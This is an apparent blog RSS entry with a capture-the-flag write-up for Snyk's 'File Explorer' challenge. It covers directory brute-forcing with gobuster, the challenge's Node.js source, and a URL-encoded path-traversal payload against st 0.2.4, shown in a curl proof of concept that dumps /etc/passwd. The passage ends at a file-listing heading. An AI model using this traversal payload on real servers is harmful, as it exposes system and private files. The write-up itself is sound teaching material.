<rss xmlns:atom="http://www.w3.org/2005/Atom" version="2.0"><channel><title>web - Category - Pascal's Blog</title><link>https://blog.ppeinecke.de/categories/web/</link><description>web - Category - Pascal's Blog</description><generator>Hugo -- gohugo.io</generator><language>en</language><lastBuildDate>Mon, 05 Dec 2022 00:09:37 +0100</lastBuildDate><atom:link href="https://blog.ppeinecke.de/categories/web/" rel="self" type="application/rss+xml"/><item><title>Synk Fetch the Flag 2022 - Web - File Explorer</title><link>https://blog.ppeinecke.de/posts/fetch-the-flag-2022-web-file-explorer/</link><pubDate>Mon, 05 Dec 2022 00:09:37 +0100</pubDate><guid>https://blog.ppeinecke.de/posts/fetch-the-flag-2022-web-file-explorer/</guid><description><![CDATA[<div class="featured-image">
                <img src="/featuredImages/file_explorer.png" referrerpolicy="no-referrer">
            </div><h1 id="file-explorer">File Explorer</h1>
<h2 id="description">description</h2>
<p>tags:</p>
<ul>
<li>node.js</li>
<li>Snyk Open Source</li>
</ul>
<p>Expose hidden files in the web application.</p>
<p><a href="http://file-explorer.c.ctf-snyk.io/" target="_blank" rel="noopener noreffer">http://file-explorer.c.ctf-snyk.io/</a></p>
<p>hint: <a href="https://github.com/lcrowther-snyk/file-explorer" target="_blank" rel="noopener noreffer">https://github.com/lcrowther-snyk/file-explorer</a></p>
<h2 id="writeup">writeup</h2>
<p>After opening the website <a href="http://file-explorer.c.ctf-snyk.io/" target="_blank" rel="noopener noreffer">http://file-explorer.c.ctf-snyk.io/</a> in my webbrowser I see this:</p>
<p></p>
<p>the link with the caption “<strong>here”</strong> redirects me to <a href="http://file-explorer.c.ctf-snyk.io/public/" target="_blank" rel="noopener noreffer">http://file-explorer.c.ctf-snyk.io/public/</a> and we can see a directory listing:</p>
<p></p>
<p>This is the source code of the main site (<a href="http://file-explorer.c.ctf-snyk.io/" target="_blank" rel="noopener noreffer">http://file-explorer.c.ctf-snyk.io/</a>):</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-html" data-lang="html"><span class="line"><span class="cl"><span class="cp">&lt;!DOCTYPE html&gt;</span>
</span></span><span class="line"><span class="cl"><span class="p">&lt;</span><span class="nt">html</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="p">&lt;</span><span class="nt">h1</span> <span class="na">id</span><span class="o">=</span><span class="s">&#34;page-title&#34;</span><span class="p">&gt;</span>Go ahead hack m3<span class="p">&lt;/</span><span class="nt">h1</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl"><span class="p">&lt;</span><span class="nt">h2</span> <span class="na">id</span><span class="o">=</span><span class="s">&#34;page-title&#34;</span><span class="p">&gt;</span>find the flag<span class="p">&lt;/</span><span class="nt">h2</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="p">&lt;</span><span class="nt">p</span><span class="p">&gt;</span>Take a look at our files <span class="p">&lt;</span><span class="nt">a</span> <span class="na">href</span><span class="o">=</span><span class="s">&#34;/public/&#34;</span><span class="p">&gt;</span>here<span class="p">&lt;</span><span class="nt">a</span><span class="p">&gt;&lt;/</span><span class="nt">p</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="p">&lt;/</span><span class="nt">body</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl"><span class="p">&lt;/</span><span class="nt">html</span><span class="p">&gt;</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>After I could not find anything interesting on that directory I ran gobuster to scan for any hidden files:</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span><span class="lnt">23
</span><span class="lnt">24
</span><span class="lnt">25
</span><span class="lnt">26
</span><span class="lnt">27
</span><span class="lnt">28
</span><span class="lnt">29
</span><span class="lnt">30
</span><span class="lnt">31
</span><span class="lnt">32
</span><span class="lnt">33
</span><span class="lnt">34
</span><span class="lnt">35
</span><span class="lnt">36
</span><span class="lnt">37
</span><span class="lnt">38
</span><span class="lnt">39
</span><span class="lnt">40
</span><span class="lnt">41
</span><span class="lnt">42
</span><span class="lnt">43
</span><span class="lnt">44
</span><span class="lnt">45
</span><span class="lnt">46
</span><span class="lnt">47
</span><span class="lnt">48
</span><span class="lnt">49
</span><span class="lnt">50
</span><span class="lnt">51
</span><span class="lnt">52
</span><span class="lnt">53
</span><span class="lnt">54
</span><span class="lnt">55
</span><span class="lnt">56
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">mkdir gobuster
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">gobuster dir --url <span class="o">[</span>http://file-explorer.c.ctf-snyk.io/<span class="o">](</span>http://file-explorer.c.ctf-snyk.io/<span class="o">)</span> --output gobuster/big.txt -w /usr/share/wordlists/dirb/big.txt
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">/blog9.txt            <span class="o">(</span>Status: 502<span class="o">)</span> <span class="o">[</span>Size: 332<span class="o">]</span>
</span></span><span class="line"><span class="cl">/carrito.php          <span class="o">(</span>Status: 502<span class="o">)</span> <span class="o">[</span>Size: 332<span class="o">]</span>
</span></span><span class="line"><span class="cl">/cd                   <span class="o">(</span>Status: 502<span class="o">)</span> <span class="o">[</span>Size: 332<span class="o">]</span>
</span></span><span class="line"><span class="cl">/css-js.txt           <span class="o">(</span>Status: 502<span class="o">)</span> <span class="o">[</span>Size: 332<span class="o">]</span>
</span></span><span class="line"><span class="cl">/ebayimages.txt       <span class="o">(</span>Status: 502<span class="o">)</span> <span class="o">[</span>Size: 332<span class="o">]</span>
</span></span><span class="line"><span class="cl">/edit_saved.php       <span class="o">(</span>Status: 502<span class="o">)</span> <span class="o">[</span>Size: 332<span class="o">]</span>
</span></span><span class="line"><span class="cl">/editors.txt          <span class="o">(</span>Status: 502<span class="o">)</span> <span class="o">[</span>Size: 332<span class="o">]</span>
</span></span><span class="line"><span class="cl">/edito.zip            <span class="o">(</span>Status: 502<span class="o">)</span> <span class="o">[</span>Size: 332<span class="o">]</span>
</span></span><span class="line"><span class="cl">/eds                  <span class="o">(</span>Status: 502<span class="o">)</span> <span class="o">[</span>Size: 332<span class="o">]</span>
</span></span><span class="line"><span class="cl">/elo.txt              <span class="o">(</span>Status: 502<span class="o">)</span> <span class="o">[</span>Size: 332<span class="o">]</span>
</span></span><span class="line"><span class="cl">/gertrude             <span class="o">(</span>Status: 502<span class="o">)</span> <span class="o">[</span>Size: 332<span class="o">]</span>
</span></span><span class="line"><span class="cl">/gi.txt               <span class="o">(</span>Status: 502<span class="o">)</span> <span class="o">[</span>Size: 332<span class="o">]</span>
</span></span><span class="line"><span class="cl">/gizmo.txt            <span class="o">(</span>Status: 502<span class="o">)</span> <span class="o">[</span>Size: 332<span class="o">]</span>
</span></span><span class="line"><span class="cl">/glossario.txt        <span class="o">(</span>Status: 502<span class="o">)</span> <span class="o">[</span>Size: 332<span class="o">]</span>
</span></span><span class="line"><span class="cl">/glosuj               <span class="o">(</span>Status: 502<span class="o">)</span> <span class="o">[</span>Size: 332<span class="o">]</span>
</span></span><span class="line"><span class="cl">/glossario.php        <span class="o">(</span>Status: 502<span class="o">)</span> <span class="o">[</span>Size: 332<span class="o">]</span>
</span></span><span class="line"><span class="cl">/gprs.php             <span class="o">(</span>Status: 502<span class="o">)</span> <span class="o">[</span>Size: 332<span class="o">]</span>
</span></span><span class="line"><span class="cl">/graduation           <span class="o">(</span>Status: 502<span class="o">)</span> <span class="o">[</span>Size: 332<span class="o">]</span>
</span></span><span class="line"><span class="cl">Progress: <span class="m">34460</span> / <span class="m">81880</span> <span class="o">(</span>42.09%<span class="o">)</span>              <span class="o">[</span>ERROR<span class="o">]</span> 2022/11/09 14:40:12 <span class="o">[</span>!<span class="o">]</span> Get <span class="s2">&#34;http://file-explorer.c.ctf-snyk.io/graphics2&#34;</span>: context deadline exceeded <span class="o">(</span>Client.Timeout exceeded <span class="k">while</span> awaiting headers<span class="o">)</span>
</span></span><span class="line"><span class="cl">Progress: <span class="m">34536</span> / <span class="m">81880</span> <span class="o">(</span>42.18%<span class="o">)</span>              <span class="o">[</span>ERROR<span class="o">]</span> 2022/11/09 14:40:30 <span class="o">[</span>!<span class="o">]</span> Get <span class="s2">&#34;http://file-explorer.c.ctf-snyk.io/greeting.php&#34;</span>: context deadline exceeded <span class="o">(</span>Client.Timeout exceeded <span class="k">while</span> awaiting headers<span class="o">)</span>
</span></span><span class="line"><span class="cl">/gruppen.txt          <span class="o">(</span>Status: 502<span class="o">)</span> <span class="o">[</span>Size: 332<span class="o">]</span>
</span></span><span class="line"><span class="cl">/guest-tracking.txt   <span class="o">(</span>Status: 502<span class="o">)</span> <span class="o">[</span>Size: 332<span class="o">]</span>
</span></span><span class="line"><span class="cl">/guinness             <span class="o">(</span>Status: 502<span class="o">)</span> <span class="o">[</span>Size: 332<span class="o">]</span>
</span></span><span class="line"><span class="cl">/h2                   <span class="o">(</span>Status: 502<span class="o">)</span> <span class="o">[</span>Size: 332<span class="o">]</span>
</span></span><span class="line"><span class="cl">Progress: <span class="m">34912</span> / <span class="m">81880</span> <span class="o">(</span>42.64%<span class="o">)</span>              <span class="o">[</span>ERROR<span class="o">]</span> 2022/11/09 14:41:55 <span class="o">[</span>!<span class="o">]</span> Get <span class="s2">&#34;http://file-explorer.c.ctf-snyk.io/gz.php&#34;</span>: context deadline exceeded <span class="o">(</span>Client.Timeout exceeded <span class="k">while</span> awaiting headers<span class="o">)</span>
</span></span><span class="line"><span class="cl">/happyholidays        <span class="o">(</span>Status: 502<span class="o">)</span> <span class="o">[</span>Size: 332<span class="o">]</span>
</span></span><span class="line"><span class="cl">/kill                 <span class="o">(</span>Status: 502<span class="o">)</span> <span class="o">[</span>Size: 332<span class="o">]</span>
</span></span><span class="line"><span class="cl">/kindeditor.php       <span class="o">(</span>Status: 502<span class="o">)</span> <span class="o">[</span>Size: 332<span class="o">]</span>
</span></span><span class="line"><span class="cl">/kristi               <span class="o">(</span>Status: 502<span class="o">)</span> <span class="o">[</span>Size: 332<span class="o">]</span>g
</span></span><span class="line"><span class="cl">/lines.php            <span class="o">(</span>Status: 502<span class="o">)</span> <span class="o">[</span>Size: 332<span class="o">]</span>
</span></span><span class="line"><span class="cl">/link_exchange.txt    <span class="o">(</span>Status: 502<span class="o">)</span> <span class="o">[</span>Size: 332<span class="o">]</span>
</span></span><span class="line"><span class="cl">/link_banner          <span class="o">(</span>Status: 502<span class="o">)</span> <span class="o">[</span>Size: 332<span class="o">]</span>
</span></span><span class="line"><span class="cl">Progress: <span class="m">43600</span> / <span class="m">81880</span> <span class="o">(</span>53.25%<span class="o">)</span>              <span class="o">[</span>ERROR<span class="o">]</span> 2022/11/09 14:52:46 <span class="o">[</span>!<span class="o">]</span> Get <span class="s2">&#34;http://file-explorer.c.ctf-snyk.io/links-page.txt&#34;</span>: context deadline exceeded <span class="o">(</span>Client.Timeout exceeded <span class="k">while</span> awaiting headers<span class="o">)</span>
</span></span><span class="line"><span class="cl">/listing_photos       <span class="o">(</span>Status: 502<span class="o">)</span> <span class="o">[</span>Size: 332<span class="o">]</span>
</span></span><span class="line"><span class="cl">/listmail.php         <span class="o">(</span>Status: 502<span class="o">)</span> <span class="o">[</span>Size: 332<span class="o">]</span>
</span></span><span class="line"><span class="cl">Progress: <span class="m">43776</span> / <span class="m">81880</span> <span class="o">(</span>53.46%<span class="o">)</span>              <span class="o">[</span>ERROR<span class="o">]</span> 2022/11/09 14:53:10 <span class="o">[</span>!<span class="o">]</span> Get <span class="s2">&#34;http://file-explorer.c.ctf-snyk.io/liuyan.zip&#34;</span>: context deadline exceeded <span class="o">(</span>Client.Timeout exceeded <span class="k">while</span> awaiting headers<span class="o">)</span>
</span></span><span class="line"><span class="cl">Progress: <span class="m">43788</span> / <span class="m">81880</span> <span class="o">(</span>53.48%<span class="o">)</span>              <span class="o">[</span>ERROR<span class="o">]</span> 2022/11/09 14:53:11 <span class="o">[</span>!<span class="o">]</span> Get <span class="s2">&#34;http://file-explorer.c.ctf-snyk.io/lit.php&#34;</span>: context deadline exceeded <span class="o">(</span>Client.Timeout exceeded <span class="k">while</span> awaiting headers<span class="o">)</span>
</span></span><span class="line"><span class="cl">Progress: <span class="m">44008</span> / <span class="m">81880</span> <span class="o">(</span>53.75%<span class="o">)</span>              <span class="o">[</span>ERROR<span class="o">]</span> 2022/11/09 14:53:48 <span class="o">[</span>!<span class="o">]</span> Get <span class="s2">&#34;http://file-explorer.c.ctf-snyk.io/ln.php&#34;</span>: context deadline exceeded <span class="o">(</span>Client.Timeout exceeded <span class="k">while</span> awaiting headers<span class="o">)</span>
</span></span><span class="line"><span class="cl">/louis.php            <span class="o">(</span>Status: 502<span class="o">)</span> <span class="o">[</span>Size: 332<span class="o">]</span>
</span></span><span class="line"><span class="cl">/lucas.zip            <span class="o">(</span>Status: 502<span class="o">)</span> <span class="o">[</span>Size: 332<span class="o">]</span>
</span></span><span class="line"><span class="cl">/lulu.zip             <span class="o">(</span>Status: 502<span class="o">)</span> <span class="o">[</span>Size: 332<span class="o">]</span>
</span></span><span class="line"><span class="cl">/ma                   <span class="o">(</span>Status: 502<span class="o">)</span> <span class="o">[</span>Size: 332<span class="o">]</span>
</span></span><span class="line"><span class="cl">/ma-fr.zip            <span class="o">(</span>Status: 502<span class="o">)</span> <span class="o">[</span>Size: 332<span class="o">]</span>
</span></span><span class="line"><span class="cl">/m2css.zip            <span class="o">(</span>Status: 502<span class="o">)</span> <span class="o">[</span>Size: 332<span class="o">]</span>
</span></span><span class="line"><span class="cl">/maint.php            <span class="o">(</span>Status: 502<span class="o">)</span> <span class="o">[</span>Size: 332<span class="o">]</span>
</span></span><span class="line"><span class="cl">/makeover.php         <span class="o">(</span>Status: 502<span class="o">)</span> <span class="o">[</span>Size: 332<span class="o">]</span>
</span></span><span class="line"><span class="cl">/manufacturers        <span class="o">(</span>Status: 502<span class="o">)</span> <span class="o">[</span>Size: 332<span class="o">]</span>
</span></span><span class="line"><span class="cl">/marilyn.php          <span class="o">(</span>Status: 502<span class="o">)</span> <span class="o">[</span>Size: 332<span class="o">]</span>
</span></span><span class="line"><span class="cl">/mark                 <span class="o">(</span>Status: 502<span class="o">)</span> <span class="o">[</span>Size: 332<span class="o">]</span>
</span></span><span class="line"><span class="cl">Progress: <span class="m">46060</span> / <span class="m">81880</span> <span class="o">(</span>56.25%<span class="o">)</span>              <span class="o">[</span>ERROR<span class="o">]</span> 2022/11/09 14:58:23 <span class="o">[</span>!<span class="o">]</span> Get <span class="s2">&#34;http://file-explorer.c.ctf-snyk.io/maxwell&#34;</span>: context deadline exceeded <span class="o">(</span>Client.Timeout exceeded <span class="k">while</span> awaiting headers<span class="o">)</span>
</span></span><span class="line"><span class="cl">/mypoints.php         <span class="o">(</span>Status: 502<span class="o">)</span> <span class="o">[</span>Size: 332<span class="o">]</span>
</span></span><span class="line"><span class="cl">/null.php             <span class="o">(</span>Status: 502<span class="o">)</span> <span class="o">[</span>Size: 332<span class="o">]</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>But unfortunately gobuster did not find anything.</p>
<p>In the hint of this challenge is a github repository mentioned:</p>
<p><a href="https://github.com/lcrowther-snyk/file-explorer/blob/main/app.js" target="_blank" rel="noopener noreffer">file-explorer/app.js at main · lcrowther-snyk/file-explorer</a></p>
<p>That looks to be the source code of this challenge!</p>
<p>The server is running node.js and here is the source code of the <code>app.js</code> file:</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span><span class="lnt">23
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-jsx" data-lang="jsx"><span class="line"><span class="cl"><span class="cm">/**
</span></span></span><span class="line"><span class="cl"><span class="cm"> * Module dependencies.
</span></span></span><span class="line"><span class="cl"><span class="cm"> */</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="kd">var</span> <span class="nx">st</span> <span class="o">=</span> <span class="nx">require</span><span class="p">(</span><span class="s1">&#39;st&#39;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="kd">var</span> <span class="nx">express</span> <span class="o">=</span> <span class="nx">require</span><span class="p">(</span><span class="s1">&#39;express&#39;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="kd">var</span> <span class="nx">http</span> <span class="o">=</span> <span class="nx">require</span><span class="p">(</span><span class="s1">&#39;http&#39;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="kd">var</span> <span class="nx">app</span> <span class="o">=</span> <span class="nx">express</span><span class="p">();</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c1">// all environments
</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="nx">app</span><span class="p">.</span><span class="nx">set</span><span class="p">(</span><span class="s1">&#39;port&#39;</span><span class="p">,</span> <span class="nx">process</span><span class="p">.</span><span class="nx">env</span><span class="p">.</span><span class="nx">PORT</span> <span class="o">||</span> <span class="mi">3001</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="nx">app</span><span class="p">.</span><span class="nx">get</span><span class="p">(</span><span class="s1">&#39;/&#39;</span><span class="p">,</span> <span class="kd">function</span><span class="p">(</span><span class="nx">request</span><span class="p">,</span> <span class="nx">response</span><span class="p">){</span>
</span></span><span class="line"><span class="cl">  <span class="nx">response</span><span class="p">.</span><span class="nx">sendFile</span><span class="p">(</span><span class="nx">process</span><span class="p">.</span><span class="nx">cwd</span><span class="p">()</span> <span class="o">+</span><span class="s1">&#39;/index.html&#39;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="p">});</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c1">// Static
</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="nx">app</span><span class="p">.</span><span class="nx">use</span><span class="p">(</span><span class="nx">st</span><span class="p">({</span> <span class="nx">path</span><span class="o">:</span> <span class="s1">&#39;./public&#39;</span><span class="p">,</span> <span class="nx">url</span><span class="o">:</span> <span class="s1">&#39;/public&#39;</span> <span class="p">}));</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="nx">http</span><span class="p">.</span><span class="nx">createServer</span><span class="p">(</span><span class="nx">app</span><span class="p">).</span><span class="nx">listen</span><span class="p">(</span><span class="nx">app</span><span class="p">.</span><span class="nx">get</span><span class="p">(</span><span class="s1">&#39;port&#39;</span><span class="p">),</span> <span class="kd">function</span> <span class="p">()</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">  <span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="s1">&#39;Express server listening on port &#39;</span> <span class="o">+</span> <span class="nx">app</span><span class="p">.</span><span class="nx">get</span><span class="p">(</span><span class="s1">&#39;port&#39;</span><span class="p">));</span>
</span></span><span class="line"><span class="cl"><span class="p">});</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>We can also take a look at the <code>package.json</code> file to get the version numbers of the packages:</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-jsx" data-lang="jsx"><span class="line"><span class="cl"><span class="p">{</span>
</span></span><span class="line"><span class="cl">  <span class="s2">&#34;name&#34;</span><span class="o">:</span> <span class="s2">&#34;goof&#34;</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">  <span class="s2">&#34;version&#34;</span><span class="o">:</span> <span class="s2">&#34;1.0.1&#34;</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">  <span class="s2">&#34;description&#34;</span><span class="o">:</span> <span class="s2">&#34;A vulnerable todo demo application&#34;</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">  <span class="s2">&#34;homepage&#34;</span><span class="o">:</span> <span class="s2">&#34;https://snyk.io/&#34;</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">  <span class="s2">&#34;repository&#34;</span><span class="o">:</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="s2">&#34;type&#34;</span><span class="o">:</span> <span class="s2">&#34;git&#34;</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">    <span class="s2">&#34;url&#34;</span><span class="o">:</span> <span class="s2">&#34;https://github.com/Snyk/snyk-todo-list-demo-app/&#34;</span>
</span></span><span class="line"><span class="cl">  <span class="p">},</span>
</span></span><span class="line"><span class="cl">  <span class="s2">&#34;scripts&#34;</span><span class="o">:</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="s2">&#34;start&#34;</span><span class="o">:</span> <span class="s2">&#34;node app.js&#34;</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">    <span class="s2">&#34;build&#34;</span><span class="o">:</span> <span class="s2">&#34;browserify -r jquery &gt; public/js/bundle.js&#34;</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">    <span class="s2">&#34;cleanup&#34;</span><span class="o">:</span> <span class="s2">&#34;mongo express-todo --eval &#39;db.todos.remove({});&#39;&#34;</span>
</span></span><span class="line"><span class="cl">  <span class="p">},</span>
</span></span><span class="line"><span class="cl">  <span class="s2">&#34;engines&#34;</span><span class="o">:</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="s2">&#34;node&#34;</span><span class="o">:</span> <span class="s2">&#34;6.14.1&#34;</span>
</span></span><span class="line"><span class="cl">  <span class="p">},</span>
</span></span><span class="line"><span class="cl">  <span class="s2">&#34;dependencies&#34;</span><span class="o">:</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="s2">&#34;express&#34;</span><span class="o">:</span> <span class="s2">&#34;4.16.0&#34;</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">    <span class="s2">&#34;st&#34;</span><span class="o">:</span> <span class="s2">&#34;0.2.4&#34;</span>
</span></span><span class="line"><span class="cl">  <span class="p">}</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>I think it is weird that the program is using the <strong>st</strong> library.</p>
<p>The version used for <strong>st</strong> is <strong>0.2.4.</strong></p>
<p>After searching the internet , there seems to be a LFI vulnerability for this version of st.</p>
<p>Here is the link to snyk for the vulnerability:</p>
<p><a href="https://security.snyk.io/vuln/npm:st:20140206" target="_blank" rel="noopener noreffer">https://security.snyk.io/vuln/npm:st:20140206</a></p>
<p>Versions prior to 0.2.5 did not properly prevent path traversal. Literal dots in a path were resolved out, but url encoded dots were not. Thus, a request like <code>/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd</code> would leak sensitive files and data from the server.</p>
<p>As of version 0.2.5, any <code>'/../'</code> in the request path, urlencoded or not, will be replaced with <code>'/'</code>. If your application depends on url traversal, then you are encouraged to please refactor so that you do not depend on having <code>..</code> in url paths, as this tends to expose data that you may be surprised to be exposing.</p>
<p>So it seems like we can get LFI working here by just encoding the <code>../</code> characters using URL-encoding. A single dot in URL encoding is: <code>%2e</code> . So two dots would be <code>%2e%2e</code> and the forward slash character is represented as <code>%2f</code> in URL-encoded form.</p>
<p>By replacing problematic characters like mentioned in the snyk vulnerability we could craft a payload that looks like this:</p>
<p><code>%2e%2e%2f%2e%2e%2f%2e%2e%2F%2e%2e%2F%2e%2e/etc/passwd</code></p>
<p>Here is a proof-of-concept for this LFI:</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">curl http://file-explorer.c.ctf-snyk.io/public/%2e%2e%2f%2e%2e%2f%2e%2e%2F%2e%2e%2F%2e%2e/etc/passwd
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">root:x:0:0:root:/root:/bin/bash
</span></span><span class="line"><span class="cl">daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
</span></span><span class="line"><span class="cl">bin:x:2:2:bin:/bin:/usr/sbin/nologin
</span></span><span class="line"><span class="cl">sys:x:3:3:sys:/dev:/usr/sbin/nologin
</span></span><span class="line"><span class="cl">sync:x:4:65534:sync:/bin:/bin/sync
</span></span><span class="line"><span class="cl">games:x:5:60:games:/usr/games:/usr/sbin/nologin
</span></span><span class="line"><span class="cl">man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
</span></span><span class="line"><span class="cl">lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
</span></span><span class="line"><span class="cl">mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
</span></span><span class="line"><span class="cl">news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
</span></span><span class="line"><span class="cl">uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
</span></span><span class="line"><span class="cl">proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
</span></span><span class="line"><span class="cl">www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
</span></span><span class="line"><span class="cl">backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
</span></span><span class="line"><span class="cl">list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
</span></span><span class="line"><span class="cl">irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
</span></span><span class="line"><span class="cl">gnats:x:41:41:Gnats Bug-Reporting System <span class="o">(</span>admin<span class="o">)</span>:/var/lib/gnats:/usr/sbin/nologin
</span></span><span class="line"><span class="cl">nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
</span></span><span class="line"><span class="cl">_apt:x:100:65534::/nonexistent:/bin/false
</span></span><span class="line"><span class="cl">node:x:1000:1000::/home/node:/bin/bash
</span></span></code></pre></td></tr></table>
</div>
</div><p>We can get the contents of /etc/passwd which means that the LFI works!</p>
<p>It can even be abused to get directory listing:</p>
<p>File Listing PoC:</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span></code></pre></td>
<td class="lntd">
